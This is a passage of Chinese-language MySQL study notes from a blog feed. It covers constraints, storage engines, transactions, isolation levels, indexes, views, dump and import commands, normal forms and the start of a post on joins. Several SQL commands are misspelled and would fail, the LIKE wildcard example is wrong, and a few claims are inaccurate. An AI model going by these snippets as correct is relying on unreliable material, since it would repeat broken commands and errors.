cname varchar(255),
primary key(cno)
);</code></pre><p>   create table t_student(</p>
<pre><code> sno int,
 sname varchar(255),
 classno int,
 primary key(sno),
 foreign key(classno) references t_class(cno)
);

insert into t_class values(101,&apos;xxxxxxxxxxxxx&apos;);
insert into t_class values(102,&apos;yyyyyyyyyyyyy&apos;);

insert into t_student values(1,&apos;zs1&apos;,101);
insert into t_student values(2,&apos;zs2&apos;,101);
insert into t_student values(3,&apos;zs3&apos;,102);
insert into t_student values(4,&apos;zs4&apos;,102);
select * from t_class;
select * from t_student;</code></pre></li>
</ul>
<p>+—–+—————+<br>| cno | cname         |<br>+—–+—————+<br>| 101 | xxxxxxxxxxxxx |<br>| 102 | yyyyyyyyyyyyy |<br>+—–+—————+<br>2 rows in set (0.00 sec)</p>
<p>+——+——-+———+<br>| sno  | sname | classno |<br>+——+——-+———+<br>|    1 | zs1   |     101 |<br>|    2 | zs2   |     101 |<br>|    3 | zs3   |     102 |<br>|    4 | zs4   |     102 |<br>+——+——-+———+<br>4 rows in set (0.00 sec)</p>
<p><em>外键值可以为NULL？</em><br>　可以为NULL</p>
<p><em>外键字段引用其他表的某个字段的时候，被引用的字段必须是主键吗？</em><br>　注意：被引用的字段不一定是主键，但至少具有unique约束。</p>
<h1 id="存储引擎（整个内容属于了解内容）"><a href="#存储引擎（整个内容属于了解内容）" class="headerlink" title="存储引擎（整个内容属于了解内容）"></a>存储引擎（整个内容属于了解内容）</h1><h2 id="完整的建表语句"><a href="#完整的建表语句" class="headerlink" title="完整的建表语句"></a>完整的建表语句</h2><pre><code>CREATE TABLE `t_x` (
`id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

注意：在mysql当中，凡是标识符是可以使用飘号括起来的。&apos;`&apos;

建表的时候可以指定存储引擎，也可以指定字符集。
mysql默认使用的存储引擎是InnoDB方式
默认采用的字符集是UTF-8</code></pre><h2 id="什么时存储引擎？"><a href="#什么时存储引擎？" class="headerlink" title="什么时存储引擎？"></a>什么时存储引擎？</h2><p>*　存储引擎这个名字只有在mysql中存在。（Oracle中有对应的机制，但是不叫做存储引擎。 oracle没有特殊的名字，就是“表的存储方式”）*</p>
<p><strong>mysql支持很多存储引擎，每一个存储引擎都对应了一种不同的存储方式。</strong><br><strong>每一个存储引擎都有自己的优缺点，需要在合适的时机选择合适的存储引擎。</strong></p>
<p>———–+<br>| Engine             | Support | Comment                                                        | Transactions | XA   | Savepoints |<br>+——————–+———+—————————————————————-+————–+——+————+<br>| InnoDB             | DEFAULT | Supports transactions, row-level locking, and foreign keys     | YES          | YES  | YES        |<br>| MRG_MYISAM         | YES     | Collection of identical MyISAM tables                          | NO           | NO   | NO         |<br>| MEMORY             | YES     | Hash based, stored in memory, useful for temporary tables      | NO           | NO   | NO         |<br>| BLACKHOLE          | YES     | /dev/null storage engine (anything you write to it disappears) | NO           | NO   | NO         |<br>| MyISAM             | YES     | MyISAM storage engine                                          | NO           | NO   | NO         |<br>| CSV                | YES     | CSV storage engine                                             | NO           | NO   | NO         |<br>| ARCHIVE            | YES     | Archive storage engine                                         | NO           | NO   | NO         |<br>| PERFORMANCE_SCHEMA | YES     | Performance Schema                                             | NO           | NO   | NO         |<br>| FEDERATED          | NO      | Federated MySQL storage engine                                 | NULL         | NULL | NULL       |</p>
<h2 id="常见的存储引擎"><a href="#常见的存储引擎" class="headerlink" title="常见的存储引擎"></a>常见的存储引擎</h2><p>　MyISAM<br>　Transactions: No<br><em>MyISAM这种存储引擎不支持事务。</em><br><em>MyISAM是Mysql最常用的存储引擎，但是这种引擎不是默认的</em><br><em>MyISAM采用三个文件组织一张表：</em><br>    xxx.frm（存储格式的文件）<br>    xxx.MYD（存储表中数据的文件）<br>    xxx.MYI（存储表中索引的文件）<br>    优点：可被压缩，节省存储空间。并且可以转换为只读表，提高检索效率。<br>    缺点：不支持事务</p>
<hr>
<p>　InnoDB<br>*　优点：支持事务、行级锁、外键等。这种存储引擎数据的安全得到保障。</p>
<p>*　表的结构存储在xxx.frm文件中*<br>*　数据存储在tablespace这样的表空间中（逻辑概念），无法被压缩，无法转换只读。*<br>*　这种InnoDB存储引擎在Mysql数据库崩溃之后提供自动恢复机制*<br>*　InnoDB支持级联删除和级联更新*</p>
<hr>
<p>　MEMORY<br>　<em>缺点：不支持事务。数据容易丢失，因为所有数据和索引都是存储在内存当中的。</em><br>　<em>优点：查询速度最快<br>*</em>以前叫做HEPA引擎**</p>
<h1 id="事务（Transaction）"><a href="#事务（Transaction）" class="headerlink" title="事务（Transaction）"></a>事务（Transaction）</h1><h2 id="什么是事务"><a href="#什么是事务" class="headerlink" title="什么是事务"></a>什么是事务</h2><p>　<em>一个事务是一个完整的业务逻辑单元，不可再分。</em><br><strong>例如：银行账户转账，从A账户向B账户转账10000，需要执行两条update语句</strong></p>
<pre><code>    update t_act set balance = balance - 10000 where actno = &apos;act-001&apos;;
    update t_act set balance = balance + 10000 where actno = &apos;act-002&apos;;

以上两条DML语句必须同时成功，或者同时失败，不允许出现一条成功，一条失败。

要想保证以上的两条DML语句同时成功或者同时失败，那么就需要使用数据库的“事务机制”。</code></pre><h2 id="和事务相关的语句只有：DML语句。（insert-delete-update）"><a href="#和事务相关的语句只有：DML语句。（insert-delete-update）" class="headerlink" title="和事务相关的语句只有：DML语句。（insert delete update）"></a>和事务相关的语句只有：DML语句。（insert delete update）</h2><pre><code>*这三个语句都是和数据库表当中“数据”相关的。*</code></pre><p>　    <strong>事务的存在是为了保证数据的完整性，安全性</strong></p>
<h2 id="假设所有的业务都能使用1条DML语句搞定，还需要事务机制吗？"><a href="#假设所有的业务都能使用1条DML语句搞定，还需要事务机制吗？" class="headerlink" title="假设所有的业务都能使用1条DML语句搞定，还需要事务机制吗？"></a>假设所有的业务都能使用1条DML语句搞定，还需要事务机制吗？</h2><p>　<strong>不需要事务。</strong><br>　但实际情况不是这样的，通常一个“事儿（事务【业务】）”需要多条DML语句共同联合完成。</p>
<h2 id="事务的特性？"><a href="#事务的特性？" class="headerlink" title="事务的特性？"></a>事务的特性？</h2><p>　<strong>事务包括四大特性：ACID</strong><br>    A：原子性（Atomicity）：事务是最小的工作单元，不可再分。<br>    C：一致性(Consistency)：事务必须保证多条DML语句同时成功或者同时失败。<br>    I：隔离性(Isolation)：事务A与事务B之间具有隔离。<br>    D：持久性(Durability)：持久性说的是最终数据必须持久化到硬盘文件中，事务才算成功的结束。</p>
<h2 id="关于事务之间的隔离性"><a href="#关于事务之间的隔离性" class="headerlink" title="关于事务之间的隔离性"></a>关于事务之间的隔离性</h2><p>　<strong>事务隔离性存在隔离级别，理论上隔离级别包括4个：</strong><br>　    <em>第一级别：读未提交（read uncommitted）</em><br>      对方事务还没有提交，我们当前事务可以读取到对方未提交的数据。<br>      读未提交存在脏读（Dirty Read）现象：表示读到了脏的数据。<br>    <em>第二级别：读已提交（read committed）</em><br>      对方事务提交之后的数据我方可以读取到。<br>      这种隔离级别解决了：脏读现象没有了<br>      读已提交存在的问题是：不可重复读。<br>    <em>第三级别：可重复读（repeatable read）</em><br>      这种隔离级别解决了：不可重复读问题<br>      这种隔离级别存在的问题是：读取到的数据是幻想。<br>    <em>第四级别：序列化读/串行化读</em><br>      解决了所有问题<br>      效率低，需要事务排队</p>
<pre><code>oracle数据默认的隔离级别是：读已提交。
mysql数据库默认的隔离级别是：可重复读。</code></pre><h2 id="演示事务"><a href="#演示事务" class="headerlink" title="演示事务"></a>演示事务</h2><p>*　mysql事务默认情况下是自动提交的。（什么是自动提交？只要执行任意一条DML语句则提交一次。）<br>　怎么关闭自动提交？start transaction;</p>
<p> 准备表：</p>
<pre><code>drop table if exists t_user;
create table t_user(
  id int primary key auto_increment,
  username varchar(255)
);</code></pre><p>　演示:mysql中的事务是支持自动提交的，只要执行一条DML，则提交一次。</p>
<pre><code>insert into t_user(username) values(&apos;zs&apos;);
select * from t_user;
rollback;
select * from t_user;</code></pre><p>mysql&gt; insert into t_user(username) values(‘zs’);<br>Query OK, 1 row affected (0.01 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>+—-+———-+<br>1 row in set (0.00 sec)</p>
<p>mysql&gt; rollback;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>+—-+———-+<br>1 row in set (0.00 sec)</p>
<p>　演示:使用start transaction;关闭自动提交机制。</p>
<pre><code>start transaction;
insert into t_user(username) values(&apos;lisi&apos;);
select * from t_user;
insert into t_user(username) values(&apos;wangwu&apos;);
select * from t_user;
rollback;
select * from t_user;</code></pre><p>mysql&gt; start transaction;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘lisi’);<br>Query OK, 1 row affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  4 | lisi     |<br>+—-+———-+<br>2 rows in set (0.00 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘wangwu’);<br>Query OK, 1 row affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  4 | lisi     |<br>|  5 | wangwu   |<br>+—-+———-+<br>3 rows in set (0.00 sec)</p>
<p>mysql&gt; rollback;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>+—-+———-+</p>
<pre><code>start transaction;
insert into t_user(username) values(&apos;wangwu&apos;);
insert into t_user(username) values(&apos;rose&apos;);
insert into t_user(username) values(&apos;jack&apos;);
select * from t_user;
commit;</code></pre><p>mysql&gt; start transaction;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘lisi’);<br>Query OK, 1 row affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  4 | lisi     |<br>+—-+———-+<br>2 rows in set (0.00 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘wangwu’);<br>Query OK, 1 row affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  4 | lisi     |<br>|  5 | wangwu   |<br>+—-+———-+<br>3 rows in set (0.00 sec)</p>
<p>mysql&gt; rollback;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>+—-+———-+<br>1 row in set (0.00 sec)</p>
<p>mysql&gt; start transaction;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘wangwu’);<br>Query OK, 1 row affected (0.01 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘rose’);<br>Query OK, 1 row affected (0.00 sec)</p>
<p>mysql&gt; insert into t_user(username) values(‘jack’);<br>Query OK, 1 row affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  6 | wangwu   |<br>|  7 | rose     |<br>|  8 | jack     |<br>+—-+———-+<br>4 rows in set (0.00 sec)</p>
<p>mysql&gt; commit;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  6 | wangwu   |<br>|  7 | rose     |<br>|  8 | jack     |<br>+—-+———-+<br>4 rows in set (0.00 sec)</p>
<p>mysql&gt; rollback;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; select * from t_user;<br>+—-+———-+<br>| id | username |<br>+—-+———-+<br>|  1 | zs       |<br>|  6 | wangwu   |<br>|  7 | rose     |<br>|  8 | jack     |<br>+—-+———-+<br>4 rows in set (0.00 sec)</p>
<p>　演示两个事务，假设隔离级别<br>　　演示级别1：读未提交</p>
<pre><code>set global transation isolation level read uncommitted;
select @@global.tx_isolation;</code></pre><p>　　演示级别2：读已提交</p>
<pre><code>set global transaction isolation level read commiteed;
select @@global.tx_isolation;</code></pre><p>　　演示级别3：可重复读</p>
<pre><code>set global transaction isolation level repeatable read;</code></pre><p>　　演示级别4：serializeble</p>
<pre><code>set global transaction isolation level serializeble;</code></pre><p>mysql远程登录： mysql -h192.168.151.18 -uroot -p444</p>
<h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><h2 id="什么时索引？有什么用？"><a href="#什么时索引？有什么用？" class="headerlink" title="什么时索引？有什么用？"></a>什么时索引？有什么用？</h2><p>　<strong>索引就相当于一本书的目录，通过目录可以快速的找到对应的资源。</strong><br>　<strong>在数据库方面，查询一张表的时候有两种检索方式：</strong><br>    <em>第一种方式：全表扫描</em></p>
<ul>
<li><p>第二种方式：根据索引检索（效率很高）*</p>
</li>
<li><p><em>索引为什么可以提高检索效率呢？*</em></p>
</li>
<li><p>　根本的原理是缩小了扫描的范围。</p>
<p>   索引虽然可以提高检索效率，但是不能随意的添加索引，因为索引也是数据库当中的对象，<br>   也需要数据库不断的维护。是有维护成本的。比如，表中的数据经常被修改<br>   这样就不适合添加索引，因为数据一旦修改，索引需要重新排序，进行维护。</p>
<p>   添加索引是给某一个字段，或者说某些字段添加索引</p>
<p>   select ename,sal from emp from where ename = ‘SMITH’;<br>   当ename字段上没有添加索引的时候，以上SQL语句会进行全表扫描，扫描ename字段中所有的值。<br>   当ename字段上添加索引的时候，以上sql语句会根据索引扫描，快速定位。</p>
</li>
</ul>
<h2 id="怎么创建索引对象？怎么删除索引对象？"><a href="#怎么创建索引对象？怎么删除索引对象？" class="headerlink" title="怎么创建索引对象？怎么删除索引对象？"></a>怎么创建索引对象？怎么删除索引对象？</h2><pre><code>创建索引对象
create index 索引名称 on 表名（字段名）;
删除索引对象：
drop　index 索引名称 on 表名</code></pre><h2 id="什么时候考虑给字段添加索引？（满足什么条件）"><a href="#什么时候考虑给字段添加索引？（满足什么条件）" class="headerlink" title="什么时候考虑给字段添加索引？（满足什么条件）"></a>什么时候考虑给字段添加索引？（满足什么条件）</h2><p>*　数据量庞大。（根据客户的需求，根据线上的环境）<br>*　该字段很少的DML操作。（因为字段进行修改操作，索引也需要维护）<br>*　该字段经常出现在where子句中。（经常根据哪个字段查询）</p>
<h2 id="注意：主键和具有unique约束的字段自动会添加索引。"><a href="#注意：主键和具有unique约束的字段自动会添加索引。" class="headerlink" title="注意：主键和具有unique约束的字段自动会添加索引。"></a>注意：主键和具有unique约束的字段自动会添加索引。</h2><p>　　根据主键查询效率较高。尽量根据主键检索</p>
<pre><code>select ename,sal from emp where sal = 5000;</code></pre><h2 id="查看sql语句的执行计划："><a href="#查看sql语句的执行计划：" class="headerlink" title="查看sql语句的执行计划："></a>查看sql语句的执行计划：</h2><pre><code>    mysql&gt; explain select ename, sal from emp where sal =5000;
    +----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------+
    | id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra       |
    +----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------+
    |  1 | SIMPLE      | emp   | NULL       | ALL  | NULL          | NULL | NULL    | NULL |   14 |    10.00 | Using where |
    +----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------+
    1 row in set, 1 warning (0.01 sec)

给薪资sal字段添加索引：
    create index emp_sal_index on emp(sal);

    mysql&gt; explain select ename, sal from emp where sal =5000;
    +----+-------------+-------+------------+------+---------------+---------------+---------+-------+------+----------+-------+
    | id | select_type | table | partitions | type | possible_keys | key           | key_len | ref   | rows | filtered | Extra |
    +----+-------------+-------+------------+------+---------------+---------------+---------+-------+------+----------+-------+
    |  1 | SIMPLE      | emp   | NULL       | ref  | emp_sal_index | emp_sal_index | 9       | const |    1 |   100.00 | NULL  |
    +----+-------------+-------+------------+------+---------------+---------------+---------+-------+------+----------+-------+
    1 row in set, 1 warning (0.00 sec)</code></pre><h2 id="索引底层采用的数据结构是：B-Tree"><a href="#索引底层采用的数据结构是：B-Tree" class="headerlink" title="索引底层采用的数据结构是：B+Tree"></a>索引底层采用的数据结构是：B+Tree</h2><h2 id="索引的实现原理？"><a href="#索引的实现原理？" class="headerlink" title="索引的实现原理？"></a>索引的实现原理？</h2><p>　<strong>通过B Tree缩小扫描范围，底层索引进行了排序，分区，索引会携带数据在表中的“物理地址”，</strong><br>　<strong>最终通过索引检索到数据之后，获取到关联的物理地址，通过物理地址定位表中的数据，效率是最高的</strong>。</p>
<pre><code>select ename from emp where ename=&apos;SMITH&apos;;
通过索引转换为：
select ename from emp where 物理地址=0x3;</code></pre><h2 id="索引的分类？"><a href="#索引的分类？" class="headerlink" title="索引的分类？"></a>索引的分类？</h2><p>单一索引：给单个字段添加索引<br>复合索引：给多个字段联合起来添加索引<br>主键索引：主键上会自动添加索引<br>唯一索引：有unique约束的字段上会自动添加索引</p>
<h2 id="索引什么时候失效？"><a href="#索引什么时候失效？" class="headerlink" title="索引什么时候失效？"></a>索引什么时候失效？</h2><pre><code>　    select ename from emp where ename like &apos;&amp;A&amp;&apos;;
模糊查询的时候，第一个通配符使用的是%，这个时候后索引是会失效的。</code></pre><h1 id="视图（view）"><a href="#视图（view）" class="headerlink" title="视图（view）"></a>视图（view）</h1><h2 id="什么时视图"><a href="#什么时视图" class="headerlink" title="什么时视图?"></a>什么时视图?</h2><pre><code>**站在不同的角度去看待数据。（同一张表的数据，通过不同的角度去看待）。**</code></pre><h2 id="怎么创建视图？怎么删除视图？"><a href="#怎么创建视图？怎么删除视图？" class="headerlink" title="怎么创建视图？怎么删除视图？"></a>怎么创建视图？怎么删除视图？</h2><pre><code>create view myview as select empno,ename from emp;
drop view myview;

注意：只有DQL语句才能以视图对象的方式创建出来。</code></pre><h2 id="对视图进行增删改查，会影响到原表数据。（通过视图影响原表数据的，不是直接操作的原表）"><a href="#对视图进行增删改查，会影响到原表数据。（通过视图影响原表数据的，不是直接操作的原表）" class="headerlink" title="对视图进行增删改查，会影响到原表数据。（通过视图影响原表数据的，不是直接操作的原表）"></a>对视图进行增删改查，会影响到原表数据。（通过视图影响原表数据的，不是直接操作的原表）</h2><p>可以对视图进行CRUD</p>
<h2 id="面向视图操作"><a href="#面向视图操作" class="headerlink" title="面向视图操作"></a>面向视图操作</h2><p>mysql&gt; select * from myview<br>    -&gt; ;<br>+——-+——–+<br>| empno | ename  |<br>+——-+——–+<br>|  7369 | SMITH  |<br>|  7499 | ALLEN  |<br>|  7521 | WARD   |<br>|  7566 | JONES  |<br>|  7654 | MARTIN |<br>|  7698 | BLAKE  |<br>|  7782 | CLARK  |<br>|  7788 | SCOTT  |<br>|  7839 | KING   |<br>|  7844 | TURNER |<br>|  7876 | ADAMS  |<br>|  7900 | JAMES  |<br>|  7902 | FORD   |<br>|  7934 | MILLER |<br>+——-+——–+<br>14 rows in set (0.01 sec)</p>
<pre><code>create table emp_back as select * from emp;
create view myview1 as select  empno,ename,sal from emp_back;
update myview1 set ename = &apos;hehe&apos;, sal = 1 where empno = 7369 ;//通过视图原表数据
delete from myview1 where empno=7369;//通过视图删除原表数据</code></pre><h2 id="视图的作用？"><a href="#视图的作用？" class="headerlink" title="视图的作用？"></a>视图的作用？</h2><p>　　<em>视图可以隐藏表的实现细节。保密级别较高的系统，数据库只对外提供相关的视图，java程序员只对视图对象进行CRUD操作。</em></p>
<h1 id="DBA命令"><a href="#DBA命令" class="headerlink" title="DBA命令"></a>DBA命令</h1><h2 id="将数据库当中的数据导出"><a href="#将数据库当中的数据导出" class="headerlink" title="将数据库当中的数据导出"></a>将数据库当中的数据导出</h2><pre><code>　　在windows的dos命令窗口中执行：（导出整个库）
mysqldump dongjun&gt;d:\dongjun.sql -uroot -p333333

在windows的dos命令窗口中执行：（导出指定数据库当中的指定表）
    mysqldump dongjun emp&gt;d:\dongjun.sql -uroot -p333333</code></pre><h2 id="导入数据"><a href="#导入数据" class="headerlink" title="导入数据"></a>导入数据</h2><pre><code>create database dongjun;
use dongjun;
source d:\dongjun.sql</code></pre><h1 id="数据库设计三范式（重点内容，面试经常问）"><a href="#数据库设计三范式（重点内容，面试经常问）" class="headerlink" title="数据库设计三范式（重点内容，面试经常问）"></a>数据库设计三范式（重点内容，面试经常问）</h1><h2 id="什么时设计范式？"><a href="#什么时设计范式？" class="headerlink" title="什么时设计范式？"></a>什么时设计范式？</h2><blockquote>
<p>　　<strong>设计表的一句。按照这个三范式设计的标不会出现数据冗余</strong></p>
</blockquote>
<h2 id="三范式都是那些？"><a href="#三范式都是那些？" class="headerlink" title="三范式都是那些？"></a>三范式都是那些？</h2><pre><code>第一范式：任何一张表有应该有主键，并且每一个字段原子性不可再分

第二范式：建立在第一范式的基础之上，所有非主键字段完全依赖主键，不能产生部分依赖
    多对多？三张表，关系表两个外键。
    t_student学生表
    sno(pk)            sname
    ------------------------------
    1            张三
    2            李四
    3            王五

    t_teacher 讲师表
    tno(pk)    tname
    -------------
    1    王老师
    2    张老师
    3    李老师

    t_student_teacher_relation 学生讲师关系表
    id(pk)        sno(fk)        tno(fk)
    -----------------------------------------
    1        1        3
    2        1        1
    3        2        2    2
    4        2        3
    5        3        1
    6        3        3

    第三范式：建立在第二范式的基础之上，所有非主键字段直接依赖主键，不能产生传递依赖。
    一对多？两张表，多的表加外键。
    班级t_class
    cno(pk)        cname
    ------------------------
    1        班级1
    2        班级2

    学生t_student
    sno(pk)        sname        classno(fk)
    --------------------------------------------
    101        张1        1
    102        张2        1
    103        张3        2
    104        张4        2
    105        张5        2

    提醒：在实际的开发中，以满足客户的需求为主，有的时候会拿冗余换执行速度。</code></pre><h2 id="一对一怎么设计？"><a href="#一对一怎么设计？" class="headerlink" title="一对一怎么设计？"></a>一对一怎么设计？</h2><pre><code>一对一设计有两种方案：主键共享
    t_user_login 用户登录表
    id(pk+fk)        username    password
    -----------------------------------------------
    1        zs        123
    2        ls        456

    t_user_detail 用户详细信息表
    id(pk)        realname    tel
    -------------------------------------------
    1        张三        1111111
    2        李四        1111123

一对一设计有两种方案：外键唯一
    t_user_login 用户登录表
    id(pk)        username    password
    -----------------------------------------------
    1        zs        123
    2        ls        456

    t_user_detail 用户详细信息表
    id(pk)        realname    tel        userid(fk+unique)
    -------------------------------------------------------------------
    1        张三        1111111        1
    2        李四        1111123        2</code></pre>]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL查询</title>
    <url>/posts/11.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="查询结果"><a href="#查询结果" class="headerlink" title="查询结果"></a>查询结果</h1><p><strong>关于查询结果集的去重？</strong>（<strong>distinct关键字去除重复记录</strong>）</p>
<blockquote>
<p><strong>mysql&gt; select distinct job from emp;</strong><br>+———–+<br>| job       |<br>+———–+<br>| CLERK     |<br>| SALESMAN  |<br>| MANAGER   |<br>| ANALYST   |<br>| PRESIDENT |<br>+———–+</p>
</blockquote>
<blockquote>
<p><strong>select ename,distinct job from emp;</strong></p>
<p>以上的sql语句是错误的。<br>记住：distinct只能出现在所有字段的最前面。</p>
</blockquote>
<blockquote>
<p><strong>mysql&gt; select distinct deptno,job from emp order by deptno;</strong><br>+——–+———–+<br>| deptno | job       |<br>+——–+———–+<br>|     10 | CLERK     |<br>|     10 | MANAGER   |<br>|     10 | PRESIDENT |<br>|     20 | ANALYST   |<br>|     20 | CLERK     |<br>|     20 | MANAGER   |<br>|     30 | CLERK     |<br>|     30 | MANAGER   |<br>|     30 | SALESMAN  |<br>+——–+———–+</p>
</blockquote>
<p><strong>案例:统计岗位的数量？</strong></p>
<blockquote>
<p>mysql&gt; select count(distinct job) from emp;**<br>+———————+<br>| count(distinct job) |<br>+———————+<br>|                   5 |<br>+———————+<br>1 row in set (0.00 sec)</p>
</blockquote>
<h1 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h1><h2 id="什么是连接查询？"><a href="#什么是连接查询？" class="headerlink" title="什么是连接查询？"></a><strong>什么是连接查询？</strong></h2><p>　<strong>在实际开发中，大部分的情况下都不是从单表中查询数据，一般都是多张表联合查询取出最终的结果。</strong><br>　<strong>在实际开发中，一般一个业务都会对应多张表，比如：学生和班级，起码两张表。</strong><br>　<strong>在实际上数据会存在大量的重复，导致数据的冗余。</strong></p>
<h2 id="连接查询的分类"><a href="#连接查询的分类" class="headerlink" title="连接查询的分类"></a>连接查询的分类</h2><p>　<strong>根据语法出现的年代来划分的，包括：</strong></p>
<p>​    <strong>SQL  92（一些老的DBA可能还在使用这种语法。DBA：Database Administrator）</strong><br>​    <strong>SQL  99（比较新的语法）</strong></p>
<p><strong>根据表的连接方式来划分，包括：</strong></p>
<ul>
<li>内连接：<br>等值连接<br>非等值连接<br>自连接</li>
<li>外连接：<br>左外连接（左连接）<br>右外连接（右连接）</li>
<li>全连接（很少用）</li>
</ul>
<h2 id="在表的连接查询方面有一种现象被称为：笛卡尔积现象"><a href="#在表的连接查询方面有一种现象被称为：笛卡尔积现象" class="headerlink" title="在表的连接查询方面有一种现象被称为：笛卡尔积现象"></a>在表的连接查询方面有一种现象被称为：笛卡尔积现象</h2><p><strong>案例：找出每一个员工的部门名称，要求显示员工名和部门名</strong></p>
<blockquote>
<p>mysql&gt; select ename,deptno from emp;<br>+——–+——–+<br>| ename  | deptno |<br>+——–+——–+<br>| SMITH  |     20 |<br>| ALLEN  |     30 |<br>| WARD   |     30 |<br>| JONES  |     20 |<br>| MARTIN |     30 |<br>| BLAKE  |     30 |<br>| CLARK  |     10 |<br>| SCOTT  |     20 |<br>| KING   |     10 |<br>| TURNER |     30 |<br>| ADAMS  |     20 |<br>| JAMES  |     30 |<br>| FORD   |     20 |<br>| MILLER |     10 |<br>+——–+——–+</p>
<p>mysql&gt; select * from dept<br>    -&gt; ;<br>+——–+————+———-+<br>| DEPTNO | DNAME      | LOC      |<br>+——–+————+———-+<br>|     10 | ACCOUNTING | NEW YORK |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |</p>
<p>select ename,dname from emp,dept;</p>
</blockquote>
<blockquote>
<p>mysql&gt; <strong>select ename,dname from emp,dept;</strong>//ename和dname要联合起来一块显示，黏到一块。<br>+——–+————+<br>| ename  | dname      |<br>+——–+————+<br>| SMITH  | ACCOUNTING |<br>| SMITH  | RESEARCH   |<br>| SMITH  | SALES      |<br>| SMITH  | OPERATIONS |<br>| ALLEN  | ACCOUNTING |<br>| ALLEN  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| ALLEN  | OPERATIONS |<br>| WARD   | ACCOUNTING |<br>| WARD   | RESEARCH   |<br>| WARD   | SALES      |<br>| WARD   | OPERATIONS |<br>| JONES  | ACCOUNTING |<br>| JONES  | RESEARCH   |<br>| JONES  | SALES      |<br>| JONES  | OPERATIONS |<br>| MARTIN | ACCOUNTING |<br>| MARTIN | RESEARCH   |<br>| MARTIN | SALES      |<br>| MARTIN | OPERATIONS |<br>| BLAKE  | ACCOUNTING |<br>| BLAKE  | RESEARCH   |<br>| BLAKE  | SALES      |<br>| BLAKE  | OPERATIONS |<br>| CLARK  | ACCOUNTING |<br>| CLARK  | RESEARCH   |<br>| CLARK  | SALES      |<br>| CLARK  | OPERATIONS |<br>| SCOTT  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| SCOTT  | SALES      |<br>| SCOTT  | OPERATIONS |<br>| KING   | ACCOUNTING |<br>| KING   | RESEARCH   |<br>| KING   | SALES      |<br>| KING   | OPERATIONS |<br>| TURNER | ACCOUNTING |<br>| TURNER | RESEARCH   |<br>| TURNER | SALES      |<br>| TURNER | OPERATIONS |<br>| ADAMS  | ACCOUNTING |<br>| ADAMS  | RESEARCH   |<br>| ADAMS  | SALES      |<br>| ADAMS  | OPERATIONS |<br>| JAMES  | ACCOUNTING |<br>| JAMES  | RESEARCH   |<br>| JAMES  | SALES      |<br>| JAMES  | OPERATIONS |<br>| FORD   | ACCOUNTING |<br>| FORD   | RESEARCH   |<br>| FORD   | SALES      |<br>| FORD   | OPERATIONS |<br>| MILLER | ACCOUNTING |<br>| MILLER | RESEARCH   |<br>| MILLER | SALES      |<br>| MILLER | OPERATIONS |<br>+——–+————+<br>56 rows in set (0.00 sec)</p>
</blockquote>
<p><strong>笛卡尔积现象：当两张表进行连接查询的时候，没有任何条件进行限制，最终的查询结果条数两张表记录条数的乘积。</strong></p>
<p><strong>关于表的别名：</strong></p>
<p>　select e.ename, d.dname from emp e, dept d;</p>
<p><strong>表的别名有什么好处</strong></p>
<p>　<strong>第一：执行效率高</strong><br>　<strong>第二：可读性好</strong></p>
<h2 id="怎么避免笛卡尔积现象？"><a href="#怎么避免笛卡尔积现象？" class="headerlink" title="怎么避免笛卡尔积现象？"></a>怎么避免笛卡尔积现象？</h2><p><strong>思考：避免了笛卡尔积现象，会减少记录的匹配次数吗？</strong></p>
<blockquote>
<p>不会，次数还是56此。只不过显示的是有效记录</p>
</blockquote>
<p>案例：找出每一个员工的部门名称，要求显示员工名和部门名。</p>
<blockquote>
